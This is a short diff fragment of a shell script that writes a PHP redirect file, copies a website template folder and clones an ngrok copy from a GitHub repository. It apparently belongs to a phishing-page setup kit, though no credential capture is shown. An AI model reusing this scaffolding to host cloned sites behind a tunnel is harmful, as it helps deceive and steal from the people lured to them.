@@ -48,8 +48,8 @@ cat <<EOF>location.php
 header ('Location: $ori');
 ?>
 EOF
-cp -r $loc/web/$website ~/web
-rm -rf ~/web/$website
+cp -R $loc/web/$website ~/web
+rm -rf $loc/web/$website
 cd ~
 if [ ! -e "$HOME/ngrok" ]; then
 git clone https://github.com/NganDii/ngrokold
